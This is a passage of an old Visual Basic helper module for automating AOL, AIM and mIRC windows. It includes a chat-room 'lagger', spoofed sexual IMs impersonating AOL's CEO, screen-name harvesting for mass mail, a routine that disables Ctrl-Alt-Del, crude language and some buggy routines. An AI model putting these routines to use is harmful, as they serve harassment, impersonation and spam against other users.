Butt% = FindWindowEx(OurParent&, Hand2&, "_AOL_Icon", vbNullString)
Call Click(Butt%)
TimeOut (1)

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Icon", vbNullString)
but1% = FindWindowEx(OurParent&, Hand1&, "_AOL_Icon", vbNullString)
Call Click(but1%)
TimeOut (1)

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
ourhandle& = FindWindowEx(OurParent&, 0, "_AOL_Listbox", vbNullString)
    Count& = SendMessage(ourhandle&, LB_GETCOUNT, 0&, 0&)
Count = Count&

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Icon", vbNullString)
but2% = FindWindowEx(OurParent&, Hand1&, "_AOL_Icon", vbNullString)
TimeOut (1)

For X = 1 To Count
Call Click(but2%)
TimeOut (0.6)
Next X

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Icon", vbNullString)
Hand2& = FindWindowEx(OurParent&, Hand1&, "_AOL_Icon", vbNullString)
nig% = FindWindowEx(OurParent&, Hand2&, "_AOL_Icon", vbNullString)
Call Click(nig%)
End Sub

Sub RoomLagger(TheText As String)
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    Y$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<html></html>" & Y$ & "<html></html>" & "<html></html>" & U$ & "<html></html>" & "<html></html>" & S$ & "<html></html>" & T$
Next W

End Sub
Sub MassMailListMaker(dalist As ListBox, trigger$)
'Put this code in a timer with an interval of about
'3 or so.
If LastChatLine = trigger$ Then dalist.AddItem SNFromLastChatLine


End Sub



Sub mIRCHide()
ParHand1& = FindWindow("mIRC32", "mIRC32")
Call Window_Hide(ParHand1&)

End Sub
Function mIRCJoinChannel(channel)
ParHand1& = FindWindow("mIRC32", "mIRC32")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "status", vbNullString)
ourhandle& = FindWindowEx(OurParent&, 0, "Edit", vbNullString)
Chat = "/Join " & channel
Call SetFocusAPI(ourhandle&)
Call SendMessageByString(ourhandle&, WM_SETTEXT, 0, channel)
DoEvents
Call SendMessageByNum(ourhandle&, WM_CHAR, 13, 0)
End Function

Function mIRCSendChat2Status(Chat)
ParHand1& = FindWindow("mIRC32", "mIRC32")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "status", vbNullString)
ourhandle& = FindWindowEx(OurParent&, 0, "Edit", vbNullString)
Call SetFocusAPI(ourhandle&)
Call SendMessageByString(ourhandle&, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(ourhandle&, WM_CHAR, 13, 0)
End Function

Sub mIRCShow()
ParHand1& = FindWindow("mIRC32", "mIRC32")
Call Window_Show(ParHand1&)

End Sub

Sub mIRCSignOn(server)
ParHand1& = FindWindow("mIRC32", "mIRC32")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "status", vbNullString)
ourhandle& = FindWindowEx(OurParent&, 0, "Edit", vbNullString)
Chat = "/server " & server
Call SetFocusAPI(ourhandle&)
Call SendMessageByString(ourhandle&, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(ourhandle&, WM_CHAR, 13, 0)
TimeOut (6)
End Sub

Sub SteveCaseIM()

Tixt = RandomNumber(11)
If Tixt = "1" Then
Tixt = "<BR><BR><BR><P><B><FONT COLOR=#0000FF PTSIZE=8>SteveCase:<font color=black ptsize=10></b>   Cum cyber with me<br><br><br><p>"
ElseIf Tixt = "2" Then: Tixt = "<BR><BR><BR><P><B><FONT COLOR=#0000FF PTSIZE=8>SteveCase:<font color=black ptsize=10></b>   Looking for a good time?<br><br><br><p>"
ElseIf Tixt = "3" Then: Tixt = "<BR><BR><BR><P><B><FONT COLOR=#0000FF PTSIZE=8>SteveCase:<font color=black ptsize=10></b>   Kiss me!<br><br><br><p>"
ElseIf Tixt = "4" Then: Tixt = "<BR><BR><BR><P><B><FONT COLOR=#0000FF PTSIZE=8>SteveCase:<font color=black ptsize=10></b>   Wanna Cyber?<br><br><br><p>"
ElseIf Tixt = "5" Then: Tixt = "<BR><BR><BR><P><B><FONT COLOR=#0000FF PTSIZE=8>SteveCase:<font color=black ptsize=10></b>   Cum eat my out, honey<br><br><br><p>"
ElseIf Tixt = "6" Then: Tixt = "<BR><BR><BR><P><B><FONT COLOR=#0000FF PTSIZE=8>SteveCase:<font color=black ptsize=10></b>   Age/Sex?<br><br><br><p>"
ElseIf Tixt = "7" Then: Tixt = "<BR><BR><BR><P><B><FONT COLOR=#0000FF PTSIZE=8>SteveCase:<font color=black ptsize=10></b>   Hey.<br><br><br><p>"
ElseIf Tixt = "8" Then: Tixt = "<BR><BR><BR><P><B><FONT COLOR=#0000FF PTSIZE=8>SteveCase:<font color=black ptsize=10></b>   Hey sexy<br><br><br><p>"
ElseIf Tixt = "9" Then: Tixt = "<BR><BR><BR><P><B><FONT COLOR=#0000FF PTSIZE=8>SteveCase:<font color=black ptsize=10></b>   Fondle my breasts<br><br><br><p>"
ElseIf Tixt = "10" Then: Tixt = "<BR><BR><BR><P><B><FONT COLOR=#0000FF PTSIZE=8>SteveCase:<font color=black ptsize=10></b>   FUCK ME!<br><br><br><p>"
ElseIf Tixt = "11" Then: Tixt = "<BR><BR><BR><P><B><FONT COLOR=#0000FF PTSIZE=8>SteveCase:<font color=black ptsize=10></b>   Tug on my balls, please<br><br><br><p>"
End If
Call IMKeyword(UserSN(), Tixt)
TimeOut (0.8)
IM% = FindChildByTitle(AOLMDI(), "  Instant Message To:")
Call AOLSetText(IM%, ">Instant Message From: Steve Case")


End Sub

Function wavy(TheText As String)
'Coded by Kramer
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    q$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<sup>" & q$ & "</sup>" & "<sub>" & U$ & "</sub>" & "<sup>" & S$ & "</sup>" & T$
Next W
wavy = p$

End Function
Sub AOL40_AddRoomList(lst As ListBox)

Dim index As Long
Dim i As Integer
For index = 0 To 25
    names$ = String$(256, " ")
    Ret = AOLGetList(index, names$)
    names$ = Left$(Trim$(names$), Len(Trim(names$)))
    ADD_AOL_LB names$, lst
Next index
endaddroom:
lst.RemoveItem lst.ListCount - 1
i = GetListIndex(lst, AOLUserSN())
If i <> -2 Then lst.RemoveItem i
End Sub
Public Function AOLGetList(index As Long, buffer As String)

On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
Room = AOL40_FindChatRoom()
aolhandle = FindChildByClass(Room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call CloseHandle(AOLProcessThread)
End If
buffer$ = Person$
End Function
Sub WAVStop()

Call WAVPlay(" ")
End Sub

Sub WAVLoop(File)

SoundName$ = File
wFlags% = SND_ASYNC Or SND_LOOP
X = sndPlaySound(SoundName$, wFlags%)
End Sub

Function AOLMessageFromIM()
IM% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
If IM% Then GoTo txt
IM% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
If IM% Then GoTo txt
Exit Function
txt:
IMText% = FindChildByClass(IM%, "RICHCNTL")
IMmessage = GetWinText(IMText%)
SN = AOLSNFromIM()
snlen = Len(AOLSNFromIM()) + 3
blah = Mid(IMmessage, InStr(IMmessagge, SN) + snlen)
AOLMessageFromIM = Left(blah, Len(blah) - 1)
End Function
Sub WAVPlay(File)

SoundName$ = File
wFlags% = SND_ASYNC Or SND_NODEFAULT
X = sndPlaySound(SoundName$, wFlags%)
End Sub

Sub SendCharNum(win, chars)

e = SendMessageByNum(win, WM_CHAR, chars, 0)
End Sub

Sub AOLRespondIM(message)

IM% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
If IM% Then GoTo Greed
Exit Sub
Greed:
e = FindChildByClass(IM%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e2 = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e2, GW_HWNDNEXT)
Call AOLSetText(e2, message)
Click (e)
Pause 0.8
e = FindChildByClass(IM%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
AOLClickIcon (e)
End Sub

Sub Enter(win)

Call SendCharNum(win, 13)
End Sub
Sub File_Delete(File)

Kill (File)
End Sub
Sub File_Open(File)

Shell (File)
End Sub
Sub File_ReName(sFromLoc As String, sToLoc As String)

Name sOldLoc As sNewLoc
End Sub
Sub Directory_Create(dir)

MkDir dir
End Sub
Sub Directory_Delete(dir)

RmDir (dir)
End Sub

Function GetCaption(hwnd)
hwndLength% = GetWindowTextLength(hwnd)
hwndTitle$ = String$(hwndLength%, 0)
a% = GetWindowText(hwnd, hwndTitle$, (hwndLength% + 1))
GetCaption = hwndTitle$
End Function
Sub SendIM(SN, message)
Call AOL40_Keyword("aol://9293:" & SN)
Do: DoEvents
IMWin% = FindChildByTitle(AOLMDI(), "Send Instant Message")
Rich% = FindChildByClass(IMWin%, "RICHCNTL")
Icon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until Rich% <> 0 And Icon% <> 0
Call SendMessageByString(Rich%, WM_SETTEXT, 0, message)
For X = 1 To 9
Icon% = GetWindow(Icon%, GW_HWNDNEXT)
Next X
Call Pause(0.01)
Click (Icon%)
Do: DoEvents
IMWin% = FindChildByTitle(AOLMDI(), "Send Instant Message")
OK% = FindWindow("#32770", "America Online")
If OK% <> 0 Then Call SendMessage(OK%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop
End Sub
Function AOLUserSN()
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
a% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
user = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
AOLUserSN = user
End Function
Function AOLSNFromIM()

IM% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
heh$ = GetCaption(IM%)
Naw$ = Mid(heh$, InStr(heh$, ":") + 2)
AOLSNFromIM = Naw$
End Function
Public Sub Disable_Ctrl_Alt_Del()
'Coded by Kramer
 Dim Ret As Integer
 Dim pOld As Boolean
 Ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, pOld, 0)
End Sub
Public Sub Enable_Ctrl_Alt_Del()
'Coded by Kramer
 Dim Ret As Integer
 Dim pOld As Boolean
 Ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, pOld, 0)
End Sub
Sub SendMail(SN, subject, message)

tool% = FindChildByClass(AOLWindow(), "AOL Toolbar")
Toolbar% = FindChildByClass(tool%, "_AOL_Toolbar")
Icon% = FindChildByClass(Toolbar%, "_AOL_Icon")
Icon% = GetWindow(Icon%, GW_HWNDNEXT)
Call AOLClickIcon(Icon%)
Do: DoEvents
Mail% = FindChildByTitle(AOLMDI(), "Write Mail")
Edit% = FindChildByClass(Mail%, "_AOL_Edit")
Rich% = FindChildByClass(Mail%, "RICHCNTL")
Icon% = FindChildByClass(Mail%, "_AOL_ICON")
Loop Until Mail% <> 0 And Edit% <> 0 And Rich% <> 0 And Icon% <> 0
Call SendMessageByString(Edit%, WM_SETTEXT, 0, SN)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Call SendMessageByString(Edit%, WM_SETTEXT, 0, subject)
Call SendMessageByString(Rich%, WM_SETTEXT, 0, message)
For GetIcon = 1 To 18
Icon% = GetWindow(Icon%, GW_HWNDNEXT)
Next GetIcon
Call AOLClickIcon(Icon%)
End Sub

Function GetClass(child)
buffer$ = String$(250, 0)
getclas% = GetClassName(child, buffer$, 250)
GetClass = buffer$

End Function
Sub AOL40_Load()

X% = Shell("C:\aol40\waol.exe", 1): nofreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40a\waol.exe", 1): nofreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40b\waol.exe", 1): nofreeze% = DoEvents(): Exit Sub
End Sub

Function AOLMDI()

AOL% = FindWindow("AOL Frame25", vbNullString)
AOLMDI = FindChildByClass(AOL%, "MDIClient")
End Function




Sub SendChat2(txt)

Rich% = FindChildByClass(AOL40_FindChatRoom, "RICHCNTL")
Rich% = GetWindow(Rich%, GW_HWNDNEXT)
Rich% = GetWindow(Rich%, GW_HWNDNEXT)
Rich% = GetWindow(Rich%, GW_HWNDNEXT)
Rich% = GetWindow(Rich%, GW_HWNDNEXT)
Rich% = GetWindow(Rich%, GW_HWNDNEXT)
Rich% = GetWindow(Rich%, GW_HWNDNEXT)
Call SetFocusAPI(Rich%)
Call SendMessageByString(Rich%, WM_SETTEXT, 0, txt)
DoEvents
Call SendMessageByNum(Rich%, WM_CHAR, 13, 0)
End Sub
Sub AOL40_Keyword(Keyword As String)

tool% = FindChildByClass(AOLWindow(), "AOL Toolbar")
Tool2% = FindChildByClass(tool%, "_AOL_Toolbar")
Icon% = FindChildByClass(Tool2%, "_AOL_Icon")
For GetIcon = 1 To 20
Icon% = GetWindow(Icon%, 2)
Next GetIcon
Call Pause(0.05)
Call Click(Icon%)
Do: DoEvents
MDI% = FindChildByClass(AOLWindow(), "MDIClient")
KeyWordWin% = FindChildByTitle(MDI%, "Keyword")
Edit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
Icon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And Edit% <> 0 And Icon2% <> 0
Call SendMessageByString(Edit%, WM_SETTEXT, 0, Keyword)
Call Pause(0.05)
Call Click(Icon2%)
Call Click(Icon2%)
End Sub
Function FreeProcess()

Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop
End Function
Function AOL40_FindChatRoom()

Room% = FindChildByClass(AOLMDI(), "AOL Child")
roomlst% = FindChildByClass(Room%, "_AOL_Listbox")
roomtxt% = FindChildByClass(Room%, "RICHCNTL")
If roomlst% <> 0 And roomtxt% <> 0 Then
AOL40_FindChatRoom = Room%
Else
AOL40_FindChatRoom = 0
End If
End Function
Function FindChildByClass(parentw, childhand)

firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
FindChildByClass = 0

bone:
Room% = firs%
FindChildByClass = Room%

End Function

Function FindChildByTitle(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)

While firs%
firss% = GetWindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) & "*" Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(GetCaption(firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
FindChildByTitle = 0

bone:
Room% = firs%
FindChildByTitle = Room%
End Function
Sub AOLHide()

X = FindWindow("AOL Frame25", 0&)
Window_Hide (X)
End Sub

Sub AOLShow()

X = FindWindow("AOL Frame25", 0&)
Window_Show (X)
End Sub

Function AOLClickList(List)
SendNow% = SendMessage(List, WM_LBUTTONDBLCLK, 0, 0)
End Function
Public Function FindMailBox() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim TabControl As Long, TabPage As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    TabControl& = FindWindowEx(child&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    If TabControl& <> 0& And TabPage& <> 0& Then
        FindMailBox& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            TabControl& = FindWindowEx(child&, 0&, "_AOL_TabControl", vbNullString)
            TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
            If TabControl& <> 0& And TabPage& <> 0& Then
                FindMailBox& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindMailBox& = 0&
End Function


Sub AOLClickIcon(Icon%)
SendNow% = SendMessage(Icon%, WM_LBUTTONDOWN, 0, 0&)
SendNow% = SendMessage(Icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub WelcomeHide()
ParHand1& = FindWindow("AOL Frame25", "America  Online")
OurParent& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
ourhandle& = FindWindowEx(OurParent&, 0, "AOL Child", vbNullString)
Call Window_Hide(ourhandle&)
End Sub

Sub WelcomeShow()
ParHand1& = FindWindow("AOL Frame25", "America  Online")
OurParent& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
ourhandle& = FindWindowEx(OurParent&, 0, "AOL Child", vbNullString)
Call Window_Show(ourhandle&)
End Sub


Sub Window_Close(win)

Dim X%
X% = SendMessage(win, WM_CLOSE, 0, 0)
End Sub






Sub StayOnTop(frm As Form)

Dim ontop%
ontop% = SetWindowPos(frm.hwnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
End Sub

Sub Window_Minimize(win)

X = ShowWindow(win, SW_MINIMIZE)
End Sub

Sub Window_Maximize(win)

X = ShowWindow(win, SW_MAXIMIZE)
End Sub


Sub Window_Hide(hwnd)

X = ShowWindow(hwnd, SW_HIDE)
End Sub



Sub Window_Show(hwnd)

X = ShowWindow(hwnd, SW_SHOW)
End Sub
Sub Pause(interval)

Current = Timer
Do While Timer - Current < Val(interval)
DoEvents
Loop
End Sub

Sub Form_Center(frm As Form)
frm.Top = (Screen.Height * 0.85) / 2 - frm.Height / 2
frm.Left = Screen.Width / 2 - frm.Width / 2
End Sub

Sub Form_Maximize(frm As Form)

frm.WindowState = 2
End Sub
Sub Form_Minimize(frm As Form)

frm.WindowState = 1
End Sub
Sub waitforok()

Do
DoEvents
okw = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If
DoEvents
Loop Until okw <> 0
   okb = FindChildByTitle(okw, "OK")
   okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
   oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)
End Sub
Sub AOLIMsOn()

Call SendIM("$IM_ON", " ")
End Sub
Sub AOLIMsOff()

Call SendIM("$IM_OFF", " ")
End Sub
Sub AOLRunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)
For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)
For GetString = 0 To MenuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, GetString)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)
If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = SubCount%
GoTo MatchString
End If
Next GetString
Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub
Sub AOLRunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer
AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)
End Sub


Function AOLWindow()

AOLWindow = FindWindow("AOL Frame25", vbNullString)
End Function





Function FindChatRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Room% = FindChildByClass(MDI%, "AOL Child")
Stuff% = FindChildByClass(Room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(Room%, "RICHCNTL")
If Stuff% <> 0 And MoreStuff% <> 0 Then
   FindChatRoom = Room%
Else:
   FindChatRoom = 0
End If
End Function
Function UserSN()
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
a% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
user = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
UserSN = user
End Function

Sub KillWait()
AO% = FindWindow("AOL Frame25", 0&)
mofo% = FindChildByClass(AO%, "MDIClient")
hit_menu "Preferences"
Do
C% = DoEvents()
PRE% = FindChildByTitle(mofo%, "Preferences")
Loop Until PRE% = 0
ICC% = FindChildByClass(PRE%, "_AOL_Icon")
Click (ICC%)
Do
C% = DoEvents()
MOO% = FindWindow("_AOL_Modal", "Chat Preferences")
Loop Until MOO% = 0
D = SendMessageByNum(MOO%, &H10, 0, 0)
D = SendMessageByNum(PRE%, &H10, 0, 0)

End Sub
Function IsUserOnline()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome,")
If welcome% <> 0 Then
   IsUserOnline = 1
Else:
   IsUserOnline = 0
End If
End Function


Sub AIM_OpenNewChatInvite()

OpenNewChatInvite1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
OpenNewChatInvite2% = FindChildByClass(OpenNewChatInvite1%, "_Oscar_TabGroup")
OpenNewChatInvite3% = FindChildByClass(OpenNewChatInvite2%, "_Oscar_IconBtn")
OpenNewChatInvite4% = GetWindow(OpenNewChatInvite3%, GW_HWNDNEXT)
Click (OpenNewChatInvite4%)
End Sub

Sub AIM_OpenNewIM()

OpenNewIM1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
OpenNewIM2% = FindChildByClass(OpenNewIM1%, "_Oscar_TabGroup")
OpenNewIM3% = FindChildByClass(OpenNewIM2%, "_Oscar_IconBtn")
OpenNewIM4% = GetWindow(OpenNewIM3%, GW_HWNDNEXT)
Click (OpenNewIM4%)
End Sub
Sub AIM_SendIM(who As String, what As String)

Call AIM_OpenNewIM
SendIM1% = FindWindow("AIM_IMessage", vbNullString)
SendIM2% = FindChildByClass(SendIM1%, "_Oscar_PersistantComb")
SendIM3% = FindChildByClass(SendIM2%, "Edit")
SendIM4% = SendMessageByString(SendIM3%, WM_SETTEXT, 0, who$)
SendIM5% = FindChildByClass(SendIM1%, "Ate32class")
SendIM6% = GetWindow(SendIM5%, GW_HWNDNEXT)
SendIM7% = SendMessageByString(SendIM6%, WM_SETTEXT, 0, what$)
SendIM8% = FindChildByClass(SendIM1%, "_Oscar_IconBtn")
Click (SendIM8%)
End Sub

Sub AIM_SendChatInvite(who$, message$, ChatName$)
Call AIM_OpenNewChatInvite
ChatInvite1% = FindWindow("AIM_ChatInviteSendWnd", vbNullString)
ChatInvite2% = FindChildByClass(ChatInvite1%, "Edit")
ChatInvite3% = SendMessageByString(ChatInvite2%, WM_SETTEXT, 0, who$)
ChatInvite4% = FindChildByTitle(ChatInvite1%, "Join me in this Buddy Chat.")
If Not message$ = "" Then Call SendMessageByString(ChatInvite4%, WM_SETTEXT, 0, message$)
For ChatInvite5% = 1 To 2
ChatInvite4% = GetWindow(ChatInvite4%, GW_HWNDNEXT)
Next ChatInvite5%
If Not ChatName = "" Then Call SendMessageByString(ChatInvite4%, WM_SETTEXT, 0, ChatName$)
ChatInvite6% = FindChildByClass(ChatInvite1%, "_Oscar_IconBtn")
For ChatInvite7% = 1 To 2
ChatInvite6% = GetWindow(ChatInvite6%, GW_HWNDNEXT)
Next ChatInvite7%
Click (ChatInvite6%)
End Sub
Sub AIM_ClearChatText()
ClearChatText1% = FindWindow("AIM_ChatWnd", vbNullString)
ClearChatText2% = FindChildByClass(ClearChatText1%, "Ate32Class")
ClearChatText3% = SendMessageByString(ClearChatText2%, WM_SETTEXT, 0, "")
End Sub


Sub AIM_ClearIMText()
ClearIMText1% = FindWindow("AIM_IMessage", vbNullString)
ClearIMText2% = FindChildByClass(ClearIMText1%, "Ate32Class")
ClearIMText3% = SendMessageByString(ClearIMText2%, WM_SETTEXT, 0, "")
End Sub


Sub SendChat(Chat)
Room% = FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub

Sub TimeOut(Duration)
starttime = Timer
Do While Timer - starttime < Duration
DoEvents
Loop

End Sub



Sub Anti45MinTimer()
AOTimer% = FindWindow("_AOL_Palette", vbNullString)
AOIcon% = FindChildByClass(AOTimer%, "_AOL_Icon")
Click (AOIcon%)
End Sub

Function AIM_GetUserSn()
If IsUserOnline = False Then Exit Function
On Error Resume Next
UserSn1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
UserSn2% = GetWindowTextLength(UserSn1%)
UserSn3$ = String$(UserSn2%, 0)
UserSn4% = GetWindowText(UserSn1%, UserSn3$, (UserSn2% + 1))
If Not Right(UserSn3$, 13) = "'s Buddy List" Then Exit Function
UserSn5$ = Mid$(UserSn3$, 1, (UserSn2% - 13))
AIMGetUserSn = UserSn5$

End Function
Function AIM_GetSnFromIM()

On Error Resume Next
SnFromIM1% = FindWindow("AIM_IMessage", vbNullString)
SnFromIM2% = GetWindowTextLength(SnFromIM1%)
SnFromIM3$ = String$(SnFromIM2%, 0)
SnFromIM4% = GetWindowText(SnFromIM1%, SnFromIM3$, (SnFromIM2% + 1))
If Not Right(SnFromIM3$, 18) = " - Instant Message" Then Exit Function
